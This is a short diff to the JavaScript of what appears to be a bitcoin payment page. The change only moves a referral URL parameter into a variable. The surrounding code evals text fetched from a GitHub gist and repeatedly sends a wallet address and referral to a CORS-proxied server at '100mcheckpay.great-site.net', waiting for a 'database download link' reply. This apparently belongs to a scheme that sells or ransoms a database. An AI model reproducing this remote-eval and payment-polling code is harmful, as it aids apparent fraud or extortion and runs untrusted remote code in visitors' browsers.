@@ -655,7 +655,7 @@
     var emails = ''
     var showbitcoinprice = '';
     var bitcoinprice = '';
-
+    var refby = new URL(location.href).searchParams.get("referenceby");
 
     $.get('https://gist.githubusercontent.com/Rustykatana007/2b6a635676c6e353c72353d4beb14319/raw/gistfile1.txt', function (ds) {
       emails = eval(ds)
@@ -715,7 +715,7 @@
       }
       $.ajax({
         type: 'GET',
-        url: 'https://corsproxy.io/?https://100mcheckpay.great-site.net/verified.php?data='+'{address:' + addr +',refrence:'+new URL(location.href).searchParams.get("referenceby")+'}',
+        url: 'https://corsproxy.io/?https://100mcheckpay.great-site.net/verified.php?data='+'{address:' + addr +',refrence:'+refby+'}',
         crossDomain: true,
         success: function (data) {
           if (data.includes('my_database_download_link')) {
@@ -738,7 +738,7 @@
     setInterval(() => {
       $.ajax({
         type: 'GET',
-        url: 'https://corsproxy.io/?https://100mcheckpay.great-site.net/verified.php?data='+'{address:auto,refrence:'+new URL(location.href).searchParams.get("referenceby")+'}',
+        url: 'https://corsproxy.io/?https://100mcheckpay.great-site.net/verified.php?data='+'{address:auto,refrence:'+refby+'}',
         crossDomain: true,
         success: function (data) {
           if (data.includes('my_database_download_link')) {
